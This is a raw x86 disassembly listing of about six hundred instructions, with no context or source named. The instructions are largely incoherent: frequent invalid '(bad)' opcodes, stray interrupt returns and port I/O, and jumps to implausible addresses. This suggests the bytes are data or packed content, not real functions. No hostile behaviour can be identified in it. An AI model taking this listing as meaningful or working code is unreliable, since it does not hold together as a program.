  41a7ae:	pushf  
  41a7af:	add    bh,al
  41a7b1:	or     al,0xd8
  41a7b3:	jne    0x41a73a
  41a7b5:	(bad)  
  41a7b6:	clc    
  41a7b7:	mov    al,0x45
  41a7b9:	call   0xffde9dfb
  41a7be:	jmp    0xddaaf4
  41a7c3:	mov    DWORD PTR [ebp-0x30],eax
  41a7c6:	xor    eax,DWORD PTR [ebp+0x3]
  41a7c9:	xor    BYTE PTR [ecx+0x45c7f49c],cl
  41a7cf:	enter  0x8503,0xc
  41a7d3:	clc    
  41a7d4:	inc    ebp
  41a7d5:	inc    ebp
  41a7d6:	push   DWORD PTR [edx]
  41a7d8:	in     al,dx
  41a7d9:	pushf  
  41a7da:	jne    0x41a769
  41a7dc:	mov    edx,eax
  41a7de:	clc    
  41a7df:	dec    ebp
  41a7e0:	out    dx,eax
  41a7e1:	(bad)  
  41a7e2:	dec    esp
  41a7e4:	mov    DWORD PTR [ebp-0x10],ecx
  41a7e7:	lea    eax,[ebp-0x38]
  41a7ea:	cmp    DWORD PTR [ebp-0x64],ecx
  41a7ed:	lea    ecx,[ebx-0x38b2273c]
  41a7f3:	mov    eax,ebx
  41a7f5:	cld    
  41a7f6:	(bad)  
  41a7f7:	iret   
  41a7f8:	mov    esp,0xf74de8cb
  41a7fd:	jmp    0x86aa01
  41a802:	test   DWORD PTR [ebx],esi
  41a804:	je     0x41a7a2
  41a806:	mov    ecx,DWORD PTR [edi]
  41a808:	fdivr  st,st(6)
  41a80a:	mov    DWORD PTR [eax],0xe8ff8bc3
  41a810:	lock iret 
  41a812:	inc    ebp
  41a813:	lock push eax
  41a815:	retf   
  41a816:	imul   ecx,DWORD PTR [ebp-0x1],0xecd88b8b
  41a81d:	test   DWORD PTR [ebp-0x7c],0x32d89c8b
  41a824:	dec    ebp
  41a825:	mov    DWORD PTR [ebx],ebp
  41a827:	fmul   DWORD PTR [ecx+0x458bd845]
  41a82d:	fmul   DWORD PTR [ebx+0x40c3f0c7]
  41a833:	enter  0x1303,0xc
  41a837:	inc    ebp
  41a838:	dec    ebp
  41a839:	xor    edi,DWORD PTR [ebx]
  41a83b:	add    esi,DWORD PTR [edx+0x50]
  41a83e:	mov    ecx,DWORD PTR [eax+esi*8]
  41a841:	inc    ebp
  41a842:	inc    eax
  41a843:	push   eax
  41a844:	mov    ebp,esp
  41a846:	lock inc DWORD PTR [ecx-0x75]
  41a84a:	mov    esp,esp
  41a84c:	fadd   DWORD PTR [eax]
  41a84e:	rol    edi,0xee
  41a851:	test   BYTE PTR [eax],al
  41a853:	dec    esp
  41a854:	push   0x32
  41a856:	dec    DWORD PTR [ebx-0x30ba0314]
  41a85c:	push   eax
  41a85d:	mov    dh,0x21
  41a85f:	add    edi,edi
  41a861:	cmp    edi,DWORD PTR [eax-0x7877af1]
  41a867:	add    BYTE PTR [ebp-0x75],al
  41a86a:	(bad)  
  41a86b:	loopne 0x41a839
  41a86d:	add    BYTE PTR [ebp+0x4584f8c7],al
  41a873:	dec    esp
  41a874:	xor    esi,DWORD PTR [edx]
  41a876:	pushf  
  41a877:	mov    eax,edi
  41a879:	cld    
  41a87a:	(bad)  
  41a87b:	iret   
  41a87c:	test   DWORD PTR [esi+0x3b4d03f8],esi
  41a882:	mov    DWORD PTR [edi],ecx
  41a884:	in     al,0x58
  41a886:	dec    ebp
  41a887:	add    BYTE PTR [ecx+0x4df0e08b],cl
  41a88d:	add    BYTE PTR [ecx+0x4d84f0c7],cl
  41a893:	dec    esp
  41a894:	mov    DWORD PTR [edx],esi
  41a896:	fmul   QWORD PTR [ebx-0x30cc03b3]
  41a89c:	add    esi,DWORD PTR [esi+0x3bd80389]
  41a8a2:	test   DWORD PTR [edi],0x3d3800
  41a8a8:	test   DWORD PTR [ebx+0x84dcf8],ecx
  41a8ae:	add    edi,eax
  41a8b0:	add    BYTE PTR [ebp+ecx*2-0x74cdccb4],al
  41a8b7:	mov    eax,DWORD PTR [ebx]
  41a8b9:	cld    
  41a8ba:	mov    edi,ecx
  41a8bc:	hlt    
  41a8bd:	mov    dh,0x45
  41a8bf:	add    esi,DWORD PTR [ebx]
  41a8c1:	cmp    ecx,DWORD PTR [ebp+0x7218300f]
  41a8c7:	add    BYTE PTR [eax],al
  41a8c9:	mov    eax,DWORD PTR [ebp-0x20]
  41a8cc:	mov    eax,DWORD PTR [eax]
  41a8ce:	call   0x33c5f69a
  41a8d3:	dec    esp
  41a8d4:	add    esi,DWORD PTR [edx]
  41a8d6:	cmp    ecx,DWORD PTR [ebx+0x98be475]
  41a8dc:	cld    
  41a8dd:	iret   
  41a8de:	(bad)  
  41a8df:	mov    ebx,es
  41a8e1:	dec    esp
  41a8e2:	push   0x32
  41a8e4:	lea    esi,[edx]
  41a8e6:	mov    al,0x8b
  41a8e8:	call   0xff4ba3dd
  41a8ed:	iret   
  41a8ee:	inc    ebp
  41a8ef:	mov    WORD PTR [ebx-0x75cdccb4],cs
  41a8f5:	or     al,BYTE PTR ds:0xe4728b
  41a8fb:	or     DWORD PTR [ebp-0x31],ecx
  41a8fe:	xor    ecx,DWORD PTR [edi+ecx*1-0x34cd3fb0]
  41a905:	cmp    al,cl
  41a907:	je     0x41aae1
  41a90d:	mov    eax,DWORD PTR [ebp-0x10]
  41a910:	mov    eax,DWORD PTR [eax]
  41a912:	xor    eax,edi
  41a914:	mov    al,BYTE PTR [ebp+eax*1+0x32724c]
  41a91b:	mov    ecx,DWORD PTR [ebp-0x20]
  41a91e:	xor    ecx,DWORD PTR [ecx]
  41a920:	bswap  edi
  41a922:	ror    BYTE PTR [ebx+ecx*8-0x7bcd3eb4],0x32
  41a92a:	add    DWORD PTR [ebx+0x945dc00],ecx
  41a930:	mov    ecx,edi
  41a932:	xor    ecx,DWORD PTR [edx+ecx*4+0x7232054c]
  41a939:	or     al,BYTE PTR [eax]
  41a93b:	mov    ecx,DWORD PTR [ebp-0x20]
  41a93e:	xor    ecx,DWORD PTR [ecx]
  41a940:	bswap  edi
  41a942:	ror    BYTE PTR [ebx+ecx*8-0x7bcd3eb0],0x3a
  41a94a:	add    DWORD PTR [edi],ecx
  41a94c:	add    BYTE PTR [eax-0x7474ffbb],dl
  41a952:	xor    ebx,esp
  41a954:	mov    al,BYTE PTR [eax]
  41a956:	add    eax,0x8472c7
  41a95b:	dec    esp
  41a95c:	dec    ebp
  41a95d:	xor    dh,BYTE PTR [ebx]
  41a95f:	mov    ecx,DWORD PTR [edi]
  41a961:	lock ror BYTE PTR [ecx],0xcb
  41a965:	iret   
  41a966:	ror    DWORD PTR [esp+eax*4+0x32014c],0x32
  41a96e:	inc    ebp
  41a96f:	mov    ecx,DWORD PTR [ebx-0x75f6cc1c]
  41a975:	iret   
  41a976:	add    eax,0x4c728c
  41a97b:	xor    cl,BYTE PTR [ebp+0xa]
  41a97e:	mov    ecx,DWORD PTR [ebx+0x98af033]
  41a984:	or     eax,0x8c72cf
  41a989:	push   eax
  41a98a:	shl    DWORD PTR [edx],0x4d
  41a98d:	cmp    cl,BYTE PTR [ebx-0x7574cc8b]
  41a993:	fmul   QWORD PTR ds:0xc77200
  41a999:	test   cl,al
  41a99b:	dec    esp
  41a99c:	dec    ebp
  41a99d:	xor    cl,BYTE PTR [ebx-0x751bcc75]
  41a9a3:	or     DWORD PTR ds:0x8c72cf,ecx
  41a9a9:	dec    esp
  41a9aa:	enter  0x8532,0x32
  41a9ae:	add    BYTE PTR [ebx+0x945e000],cl
  41a9b4:	mov    ecx,edi
  41a9b6:	xor    ecx,DWORD PTR [edx+ecx*4+0x7232054c]
  41a9bd:	or     al,BYTE PTR [eax]
  41a9bf:	mov    ecx,DWORD PTR [ebp-0x24]
  41a9c2:	mov    ecx,DWORD PTR [ecx]
  41a9c4:	xor    ecx,edi
  41a9c6:	mov    cl,BYTE PTR [ebp+ecx*1+0x327250]
  41a9cd:	cmp    al,cl
  41a9cf:	jne    0x41aa1e
  41a9d1:	lea    ecx,[ebx-0x7517cc50]
  41a9d7:	sti    
  41a9d8:	or     eax,0x4d72ff
  41a9dd:	cmp    eax,ecx
  41a9df:	je     0x41aa2e
  41a9e1:	mov    ecx,DWORD PTR [ebx-0x7538cc04]
  41a9e7:	ret    
  41a9e8:	or     eax,0x8b7245
  41a9ed:	call   0x84c771ba
  41a9f2:	add    BYTE PTR [eax+eax*1-0x74ccbace],bl
  41a9f9:	mov    esi,DWORD PTR [ebx]
  41a9fb:	cld    
  41a9fc:	mov    dl,BYTE PTR [ebp+0x5]
  41a9ff:	xor    esi,DWORD PTR [edx+0x3]
  41aa02:	add    BYTE PTR [ebx],bh
  41aa04:	dec    ebp
  41aa05:	jnp    0x8b40de02
  41aa0b:	mov    ecx,DWORD PTR ds:0x4d72fc
  41aa11:	xor    eax,ecx
  41aa13:	add    ecx,DWORD PTR [ebp+0x3b]
  41aa16:	mov    esi,DWORD PTR [ebp+0x33]
  41aa19:	mov    ecx,DWORD PTR [edx+0x724d0de8]
  41aa1f:	xor    eax,DWORD PTR [eax]
  41aa21:	(bad)  
  41aa22:	ror    DWORD PTR [eax],0x4d
  41aa25:	jb     0x41a9b2
  41aa27:	add    BYTE PTR [ebx],dh
  41aa29:	ja     0x41a9b5
  41aa2b:	sbb    BYTE PTR ds:0x8d7275,cl
  41aa31:	cwde   
  41aa32:	enter  0x50e8,0xf3
  41aa36:	inc    ebp
  41aa37:	dec    DWORD PTR [ebx-0x7574ccbb]
  41aa3d:	fadd   DWORD PTR ds:0xc372c7
  41aa43:	ror    DWORD PTR [ebp+0x13],0x8b
  41aa47:	inc    ebp
  41aa48:	xor    esi,DWORD PTR [ebx]
  41aa4a:	mov    al,BYTE PTR [ebx]
  41aa4c:	or     eax,0x187250
  41aa51:	inc    ebp
  41aa52:	rcl    DWORD PTR [eax+0x4d],0xdc
  41aa56:	mov    edi,edi
  41aa58:	xor    ecx,DWORD PTR [ebx-0x3ff21376]
  41aa5e:	jb     0x41a9e9
  41aa60:	add    ah,bl
  41aa62:	shl    DWORD PTR [ebp+0x4d],0xff
  41aa66:	mov    ebx,esp
  41aa68:	xor    eax,DWORD PTR [ebp-0x76]
  41aa6b:	add    ecx,DWORD PTR ds:0xe87208
  41aa71:	repz enter 0x10ff,0x45
  41aa76:	inc    ebp
  41aa77:	mov    edx,DWORD PTR [eax-0x28]
  41aa7a:	xor    bh,al
  41aa7c:	inc    ebx
  41aa7e:	mov    eax,ecx
  41aa80:	mov    eax,0xa00c111
  41aa85:	jne    0x41aacc
  41aa87:	mov    esi,DWORD PTR [ebx]
  41aa89:	test   al,0x3
  41aa8b:	inc    ebp
  41aa8c:	mov    DWORD PTR [eax-0xc],edx
  41aa8f:	mov    ds:0x8b33ff45,al
  41aa94:	lea    edx,[eax]
  41aa96:	xor    BYTE PTR [ebp+0x72],cl
  41aa99:	add    DWORD PTR [eax],eax
  41aa9b:	mov    eax,edi
  41aa9d:	lods   al,BYTE PTR ds:[esi]
  41aa9e:	dec    ebp
  41aa9f:	inc    ebp
  41aaa0:	mov    ecx,DWORD PTR [ecx+0x45cf14f4]
  41aaa6:	retf   
  41aaa7:	mov    edx,ecx
  41aaa9:	adc    al,0x84
  41aaab:	(bad)  
  41aaac:	std    
  41aaad:	ret    
  41aaae:	jmp    FWORD PTR [edi-0x37474bb]
  41aab4:	hlt    
  41aab5:	push   ebp
  41aab6:	(bad)  
  41aab7:	xor    eax,ebx
  41aab9:	(bad)  
  41aaba:	enter  0x1111,0x72
  41aabe:	inc    ebp
  41aabf:	add    BYTE PTR [ebx-0x387deb3f],cl
  41aac5:	cld    
  41aac6:	test   bh,bh
  41aac8:	pushf  
  41aac9:	inc    ebp
  41aaca:	xor    bl,BYTE PTR [edi-0x15]
  41aacd:	pop    ebx
  41aace:	push   0xffffffc2
  41aad0:	inc    DWORD PTR [eax]
  41aad2:	in     al,dx
  41aad3:	mov    eax,DWORD PTR [ebp+0x51]
  41aad6:	push   eax
  41aad7:	inc    ebp
  41aad8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aad9:	mov    edi,edi
  41aadb:	or     BYTE PTR [ebx+0x4d80fc16],cl
  41aae1:	add    DWORD PTR [ebx],esi
  41aae3:	add    BYTE PTR [ebx],al
  41aae5:	add    BYTE PTR [ebx],bh
  41aae7:	icebp  
  41aae8:	je     0x41aaf2
  41aaea:	mov    eax,DWORD PTR [edi]
  41aaec:	cld    
  41aaed:	rol    edi,0x72
  41aaf0:	ret    
  41aaf1:	add    BYTE PTR [edx-0x2f],ch
  41aaf4:	lea    edx,[eax]
  41aaf6:	cwde   
  41aaf7:	jne    0x41aae1
  41aaf9:	(bad)  
  41aafa:	clc    
  41aafb:	or     al,0xff
  41aafd:	inc    DWORD PTR [ebp-0x18]
  41ab00:	cmp    ebx,0x18
  41ab03:	inc    DWORD PTR [ebp+0x6]
  41ab06:	call   FWORD PTR [ebp-0x54]
  41ab09:	or     al,0x75
  41ab0b:	push   ebp
  41ab0c:	mov    ebp,esp
  41ab0e:	test   al,0x53
  41ab10:	inc    ebp
  41ab11:	mov    edx,DWORD PTR [eax-0x75]
  41ab14:	imul   ecx,DWORD PTR [eax],0xffffffff
  41ab17:	dec    ebp
  41ab18:	mov    edx,DWORD PTR [edi-0x4]
  41ab1b:	push   ebp
  41ab1c:	dec    ebp
  41ab1d:	push   ecx
  41ab1e:	xor    esi,DWORD PTR [ebx]
  41ab20:	add    edi,DWORD PTR [edi+0x74723b]
  41ab26:	push   0xffffffc7
  41ab28:	inc    DWORD PTR [ecx]
  41ab2a:	lods   al,BYTE PTR ds:[esi]
  41ab2b:	inc    ebp
  41ab2c:	inc    ebp
  41ab2d:	mov    eax,DWORD PTR [ebx]
  41ab2f:	xchg   esp,eax
  41ab30:	or     BYTE PTR [eax],al
  41ab32:	call   0xffcda3c2
  41ab37:	adc    al,0x45
  41ab39:	or     BYTE PTR [ebx+0x800ac01],0x0
  41ab40:	inc    ebp
  41ab41:	inc    ecx
  41ab42:	add    ecx,DWORD PTR [ebx-0x76baebec]
  41ab48:	mov    eax,DWORD PTR [ecx]
  41ab4a:	call   0x338af84f
  41ab4f:	push   0x3
  41ab51:	push   0xc1300f
  41ab56:	dec    ebp
  41ab57:	jo     0x41aae4
  41ab59:	push   0xffffffd4
  41ab5b:	dec    edi
  41ab5d:	mov    DWORD PTR [ebx+ecx*4-0x3ccdf764],ecx
  41ab64:	cmp    eax,edi
  41ab66:	cmovne edx,DWORD PTR [edi-0x75]
  41ab6a:	call   DWORD PTR [eax]
  41ab6c:	mov    eax,DWORD PTR [ebp+0x8]
  41ab6f:	call   FWORD PTR [esi+0x14]
  41ab72:	leave  
  41ab73:	inc    ebp
  41ab74:	adc    BYTE PTR [eax+0x55],dl
  41ab77:	jne    0x41ab65
  41ab79:	call   0xff52ab09
  41ab7e:	dec    ebp
  41ab7f:	inc    ebp
  41ab80:	mov    ecx,DWORD PTR [ebx+0x390338b]
  41ab86:	add    BYTE PTR [ebx],bh
  41ab88:	mov    esi,DWORD PTR [ecx+eax*4-0x75]
  41ab8c:	push   ebp
  41ab8d:	or     al,0x51
  41ab8f:	dec    ebp
  41ab90:	xor    DWORD PTR [ebx],0xf32039c
  41ab96:	cmp    eax,DWORD PTR [ebp+0x74]
  41ab99:	mov    edi,edi
  41ab9b:	pop    edi
  41ab9c:	adc    BYTE PTR [ebx+0x75],bl
  41ab9f:	ret    0x50
  41aba2:	mov    ecx,DWORD PTR ss:[edx-0x7d]
  41aba6:	(bad)  
  41aba7:	clc    
  41aba8:	mov    esp,ebp
  41abaa:	pop    ecx
  41abab:	mov    ecx,0xf80085c2
  41abb0:	mov    ecx,DWORD PTR [ecx+edx*2]
  41abb3:	push   esi
  41abb4:	push   esi
  41abb5:	(bad)  
  41abb6:	lock inc DWORD PTR [ebp+0x44]
  41abba:	mov    edx,DWORD PTR [eax]
  41abbc:	adc    BYTE PTR [ebx+edi*4+0x8],bh
  41abc0:	or     BYTE PTR [ebp+0x7],dl
  41abc3:	push   ecx
  41abc4:	ret    
  41abc5:	xor    ebx,DWORD PTR [esi+edi*4+0x37232]
  41abcc:	mov    esi,edi
  41abce:	mov    edi,DWORD PTR [esp+edx*1+0xc]
  41abd2:	cmp    BYTE PTR [ebp+0x1],0x89
  41abd6:	add    BYTE PTR [eax+ecx*1],ah
  41abd9:	cmp    DWORD PTR [ebp+0x10],eax
  41abdc:	mov    edx,DWORD PTR [esi]
  41abde:	xchg   esp,eax
  41abdf:	dec    esp
  41abe0:	add    BYTE PTR [eax],dl
  41abe2:	mov    ecx,edx
  41abe4:	add    edx,DWORD PTR [esp+edi*1+0x8]
  41abe8:	dec    ebp
  41abe9:	into   
  41abea:	mov    ebp,DWORD PTR [edi+0x240089d8]
  41abf0:	mov    edx,DWORD PTR [eax+0x14]
  41abf3:	das    
  41abf4:	add    al,0x45
  41abf6:	add    BYTE PTR [ebp+0x0],dh
  41abf9:	mov    edi,edi
  41abfb:	and    al,0x50
  41abfd:	mov    eax,DWORD PTR [eax]
  41abff:	and    al,0xd1
  41ac01:	xor    eax,DWORD PTR [esi]
  41ac03:	lea    eax,[ebp+0x8]
  41ac06:	xor    esi,DWORD PTR [edx+0x3]
  41ac09:	add    BYTE PTR [ecx+0x4510fc44],cl
  41ac0f:	xor    ecx,DWORD PTR [ebx+0x75eb0c9c]
  41ac15:	or     DWORD PTR [ebp-0x7a03f0],0x541608f8
  41ac1f:	xor    bh,bh
  41ac21:	pushf  
  41ac22:	mov    edi,edi
  41ac24:	or     BYTE PTR [esi+ecx*1],cl
  41ac27:	jne    0x41abec
  41ac29:	call   0xaabf5
  41ac2e:	adc    BYTE PTR [ebp+eax*2+0xc],al
  41ac32:	mov    ebx,DWORD PTR [eax]
  41ac34:	adc    BYTE PTR [ebx+eax*8+0x14],dh
  41ac38:	mov    DWORD PTR [edi+ebp*4-0x73],0x750110fc
  41ac40:	pop    esi
  41ac41:	dec    ecx
  41ac43:	and    al,0x10
  41ac45:	call   DWORD PTR [ebp+0x24]
  41ac48:	in     al,dx
  41ac49:	call   0xffc5ab32
  41ac4e:	adc    BYTE PTR [ecx+esi*1+0xc],al
  41ac52:	pushf  
  41ac53:	pop    esi
  41ac54:	mov    ebp,esp
  41ac56:	and    al,0xc2
  41ac58:	push   edi
  41ac59:	add    BYTE PTR [ecx+0x33],al
  41ac5c:	mov    DWORD PTR [ebp+0x24],esi
  41ac5f:	test   DWORD PTR [ebx-0x45f7db8b],ecx
  41ac65:	dec    DWORD PTR [eax]
  41ac67:	and    al,0x7
  41ac69:	(bad)  
  41ac6a:	cli    
  41ac6b:	and    al,0x9c
  41ac6d:	or     BYTE PTR [edx],dh
  41ac6f:	sbb    BYTE PTR [ebx],al
  41ac71:	adc    al,0x89
  41ac73:	jmp    DWORD PTR [esp]
  41ac76:	mov    ecx,DWORD PTR [ebx+0x1c7c0c0c]
  41ac7c:	adc    al,0x8
  41ac7e:	dec    ebp
  41ac7f:	adc    BYTE PTR [ebp-0x7c],dh
  41ac82:	mov    esi,DWORD PTR [edx]
  41ac84:	and    al,0x24
  41ac86:	xor    eax,DWORD PTR [ebp-0x63dbf175]
  41ac8c:	add    edi,eax
  41ac8e:	pcmpeqb mm1,mm2
  41ac91:	jmp    0x41acdf
  41ac93:	dec    DWORD PTR [eax]
  41ac95:	je     0x41ac82
  41ac97:	mov    edi,DWORD PTR [ecx]
  41ac99:	pop    ebp
  41ac9a:	adc    BYTE PTR [esp+ecx*2-0x3e],al
  41ac9e:	pushf  
  41ac9f:	mov    DWORD PTR [eax-0x8],ebp
  41aca2:	jge    0x41ad0c
  41aca4:	dec    DWORD PTR [ecx+0x5fbf7424]
